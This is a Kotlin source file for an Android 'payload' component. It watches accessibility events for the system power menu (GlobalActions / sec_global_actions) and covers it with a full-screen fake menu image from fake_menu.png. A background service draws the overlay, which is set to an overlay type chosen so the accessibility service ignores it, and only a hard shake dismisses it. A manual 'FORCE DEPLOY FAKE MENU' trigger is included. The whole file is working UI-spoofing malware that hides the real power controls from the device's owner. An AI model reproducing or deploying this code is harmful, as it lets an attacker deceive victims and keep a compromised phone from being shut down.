class PayloadEntry : DynamicEntry {

    @Composable
    override fun Render(context: Context, resDir: File) {
        DisposableEffect(Unit) {
            DynamicEntry.log("👁️ Payload Active: Registering Accessibility Eye for GlobalActions.")

            var isSpoofing = false

            fun searchNodeForId(node: AccessibilityNodeInfo?, keyword: String): Boolean {
                if (node == null) return false
                if (node.viewIdResourceName?.contains(keyword) == true) return true
                for (i in 0 until node.childCount) {
                    val child = try { node.getChild(i) } catch(e: Exception) { null }
                    if (child != null && searchNodeForId(child, keyword)) return true
                }
                return false
            }

            DynamicEntry.accessibilityInterceptor = { event ->
                val className = event.className?.toString() ?: ""

                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    DynamicEntry.log("🪟 Window State: $className | Pkg: ${event.packageName}")
                }

                val isTargetClass = className.contains("GlobalActions")
                val rootNode = try { event.source } catch(e: Exception) { null }
                val hasTargetRes = searchNodeForId(rootNode, "sec_global_actions")

                if (isTargetClass || hasTargetRes) {
                    if (!isSpoofing) {
                        DynamicEntry.log("🚨 DETECTED POWER MENU (Class: $isTargetClass, Res: $hasTargetRes)!")
                        DynamicEntry.log("➡️ Instructing BackgroundStub to draw image...")
                        isSpoofing = true
                        launchImageSpoof(context, resDir) {
                            isSpoofing = false
                        }
                    }
                }
            }

            onDispose {
                DynamicEntry.accessibilityInterceptor = null
                DynamicEntry.log("🛑 Payload Disposed: Accessibility Eye removed.")
            }
        }

        Column(
            modifier = Modifier.fillMaxSize(),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text("Global Actions Spoof Active", style = MaterialTheme.typography.headlineMedium)
            Spacer(modifier = Modifier.height(20.dp))
            Text("Waiting for sec_global_actions / GlobalActions...", style = MaterialTheme.typography.bodyLarge)
            Spacer(modifier = Modifier.height(20.dp))
            Button(onClick = { 
                DynamicEntry.log("⚙️ Manual Force Trigger")
                launchImageSpoof(context, resDir) {} 
            }) {
                Text("FORCE DEPLOY FAKE MENU")
            }
        }
    }

    private fun launchImageSpoof(context: Context, resDir: File, onDismiss: () -> Unit) {
        val imageFile = File(resDir, "fake_menu.png")
        if (!imageFile.exists()) {
            DynamicEntry.log("❌ Error: fake_menu.png not found in res folder!")
            onDismiss()
            return
        }

        val bitmap = try { BitmapFactory.decodeFile(imageFile.absolutePath) } catch (e: Exception) { null }
        if (bitmap == null) {
            DynamicEntry.log("❌ Error: Failed to decode fake_menu.png!")
            onDismiss()
            return
        }
        val imageBitmap = bitmap.asImageBitmap()

        // EXPLICITLY use TYPE_APPLICATION_OVERLAY so the AccessibilityService ignores it
        DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL 
                    or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN 
                    or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            width = WindowManager.LayoutParams.MATCH_PARENT,
            height = WindowManager.LayoutParams.MATCH_PARENT
        )

        DynamicEntry.overlayContent = {
            DisposableEffect(Unit) {
                val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                val accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)

                val listener = object : SensorEventListener {
                    override fun onSensorChanged(event: SensorEvent) {
                        val x = event.values[0]
                        val y = event.values[1]
                        val z = event.values[2]
                        val gForce = sqrt(x * x + y * y + z * z) / SensorManager.GRAVITY_EARTH

                        if (gForce > 2.7f) {
                            DynamicEntry.log("📳 Shake detected! Killing image overlay.")
                            DynamicEntry.overlayContent = null
                            onDismiss()
                        }
                    }
                    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
                }

                sensorManager.registerListener(listener, accelerometer, SensorManager.SENSOR_DELAY_UI)
                onDispose {
                    sensorManager.unregisterListener(listener)
                    DynamicEntry.log("🧹 Image Overlay Cleaned Up.")
                    onDismiss()
                }
            }

            Image(
                bitmap = imageBitmap,
                contentDescription = null,
                modifier = Modifier.fillMaxSize(),
                contentScale = ContentScale.FillBounds
            )
        }

        try {
            DynamicEntry.log("🚀 Starting BackgroundStub Service...")
            val intent = Intent(context, Class.forName("com.speedster.BackgroundStub"))
            context.startService(intent)
        } catch (e: Exception) { 
            DynamicEntry.log("❌ Error starting BackgroundStub: ${e.message}")
            onDismiss()
        }
    }
}

